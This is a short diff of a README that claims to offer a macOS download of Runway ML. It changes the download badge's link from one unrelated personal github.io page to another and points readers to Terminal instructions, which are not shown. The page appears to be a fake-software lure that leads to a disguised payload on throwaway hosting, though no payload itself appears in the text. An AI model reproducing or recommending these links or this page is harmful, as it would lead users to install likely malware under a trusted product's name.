@@ -1,7 +1,7 @@
 # Runway ML — Download For Mac OS  
 Runway ML is a powerful AI video and image editing platform for creators. Install it easily on macOS by following the instructions below. 🚀
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for-Mac-blue?logo=apple&style=for-the-badge)](https://fituganshfgh.github.io/.github/runwayml)
+[![Download for Mac](https://img.shields.io/badge/Download%20for-Mac-blue?logo=apple&style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/runwayml)
 
 If the download button doesn’t work, follow the instructions below using your Terminal.
 
